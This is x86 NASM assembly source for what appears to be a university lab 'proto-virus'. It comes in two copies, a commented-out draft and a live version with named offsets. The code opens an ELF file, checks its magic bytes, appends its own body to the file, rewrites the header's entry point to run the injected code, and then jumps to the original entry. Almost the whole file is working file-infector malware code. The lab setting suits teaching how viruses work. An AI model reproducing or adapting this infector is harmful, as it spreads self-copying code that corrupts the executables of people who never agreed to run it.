; %macro	syscall1 2
; 	mov	ebx, %2
; 	mov	eax, %1
; 	int	0x80
; %endmacro

; %macro	syscall3 4
; 	mov	edx, %4
; 	mov	ecx, %3
; 	mov	ebx, %2
; 	mov	eax, %1
; 	int	0x80
; %endmacro

; %macro  exit 1
; 	syscall1 1, %1
; %endmacro

; %macro  write 3
; 	syscall3 4, %1, %2, %3
; %endmacro

; %macro  read 3
; 	syscall3 3, %1, %2, %3
; %endmacro

; %macro  open 3
; 	syscall3 5, %1, %2, %3
; %endmacro

; %macro  lseek 3
; 	syscall3 19, %1, %2, %3
; %endmacro

; %macro  close 1
; 	syscall1 6, %1
; %endmacro

; %macro get_loc 1
; 	call get_my_loc
; 	sub dword [ebp - 12],  next_i - %1
; %endmacro

; %define	STK_RES	200
; %define	RDWR	2
; %define	SEEK_END 2
; %define SEEK_SET 0

; %define ENTRY		24
; %define PHDR_start	28
; %define	PHDR_size	32
; %define PHDR_memsize	20	
; %define PHDR_filesize	16
; %define	PHDR_offset	4
; %define	PHDR_vaddr	8
	
; 	global _start

; 	section .text
; _start:	push	ebp
; 	mov	ebp, esp
; 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	

; ; You code for this lab goes here
; 	get_loc OutStr
; 	write 1, [ebp - 12], 32
; 	get_loc FileName
; 	open [ebp - 12], RDWR, 0
; 	cmp eax, -1
; 	je virus_fail
; 	mov dword [ebp - 4], eax
; 	mov dword [ebp - 8], 0
; 	lea ecx, [ebp - 8]
; 	read [ebp - 4], ecx, 4
; 	mov al, byte [ebp - 7]
; 	cmp al, 'E'
; 	jne virus_fail
; 	mov al, byte [ebp - 6]
; 	cmp al, 'L'
; 	jne virus_fail
; 	mov al, byte [ebp - 5]
; 	cmp al, 'F'
; 	jne virus_fail

; 	lseek [ebp - 4], 0, SEEK_END
; 	mov dword [ebp - 68], eax
; 	get_loc _start
; 	mov ecx, [ebp - 12]
; 	get_loc virus_end
; 	mov edx, [ebp - 12]
; 	sub edx, ecx
; 	sub edx, 4
; 	write [ebp - 4], ecx, edx

; 	lseek [ebp - 4], 0, SEEK_SET
; 	lea ecx, [ebp - 64]
; 	read [ebp - 4], ecx, 52

; 	lseek [ebp - 4], 0, SEEK_END
; 	lea eax, [ebp - 40]
; 	write [ebp - 4], eax, 4

; 	mov eax, dword [ebp - 68]
; 	mov dword [ebp - 40], 0x08048000
; 	add dword [ebp - 40], eax
; 	lseek [ebp - 4], 0, SEEK_SET
; 	lea ecx, [ebp - 64]
; 	write [ebp - 4], ecx, 52



; 	close [ebp - 4]

; 	get_loc PreviousEntryPoint
; 	mov eax, [ebp - 12]
; 	mov eax, [eax]
; 	jmp eax

; virus_fail:
; 	get_loc Failstr
; 	write 1, [ebp - 12], 13

; 	get_loc PreviousEntryPoint
; 	mov eax, [ebp - 12]
; 	mov eax, [eax]
; 	jmp eax

; VirusExit:
;        exit 0            ; Termination if all is OK and no previous code to jump to
;                          ; (also an example for use of above macros)
	
; FileName:	db "ELFexec", 0
; OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
; Failstr:        db "perhaps not", 10 , 0

; get_my_loc:
; 	call next_i
; next_i:
; 	pop dword [ebp - 12]
; 	ret
	
; PreviousEntryPoint: dd VirusExit
; virus_end:


%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro get_loc 1
	call get_my_loc
	sub dword [ebp - LABEL_OFF],  next_i - %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHD_offset 64
%define FILE_SIZE_OFF 68
%define MAGIC1 7
%define MAGIC2 6
%define MAGIC3 5
%define ENTRY_OFF 40
%define FILE_DESC_OFF 4
%define LABEL_OFF 12
%define MAGIC_OFF 8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	

; You code for this lab goes here
	get_loc OutStr
	write 1, [ebp - LABEL_OFF], 32
	get_loc FileName
	open [ebp - LABEL_OFF], RDWR, 0
	cmp eax, -1
	je virus_fail
	mov dword [ebp - FILE_DESC_OFF], eax
	mov dword [ebp - MAGIC_OFF], 0
	lea ecx, [ebp - MAGIC_OFF]
	read [ebp - FILE_DESC_OFF], ecx, 4
	mov al, byte [ebp - MAGIC1]
	cmp al, 'E'
	jne virus_fail
	mov al, byte [ebp - MAGIC2]
	cmp al, 'L'
	jne virus_fail
	mov al, byte [ebp - MAGIC3]
	cmp al, 'F'
	jne virus_fail

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_END
	mov dword [ebp - FILE_SIZE_OFF], eax
	get_loc _start
	mov ecx, [ebp - LABEL_OFF]
	get_loc virus_end
	mov edx, [ebp - LABEL_OFF]
	sub edx, ecx
	sub edx, 4
	write [ebp - FILE_DESC_OFF], ecx, edx

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_offset]
	read [ebp - FILE_DESC_OFF], ecx, 52

	lseek [ebp - FILE_DESC_OFF], 0, SEEK_END
	lea eax, [ebp - ENTRY_OFF]
	write [ebp - FILE_DESC_OFF], eax, 4

	mov eax, dword [ebp - FILE_SIZE_OFF]
	mov dword [ebp - ENTRY_OFF], 0x08048000
	add dword [ebp - ENTRY_OFF], eax
	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
	lea ecx, [ebp - ELFHD_offset]
	write [ebp - FILE_DESC_OFF], ecx, 52



	close [ebp - FILE_DESC_OFF]

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

virus_fail:
	get_loc Failstr
	write 1, [ebp - LABEL_OFF], 13

	get_loc PreviousEntryPoint
	mov eax, [ebp - LABEL_OFF]
	mov eax, [eax]
	jmp eax

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop dword [ebp - LABEL_OFF]
	ret
	
PreviousEntryPoint: dd VirusExit
virus_end:


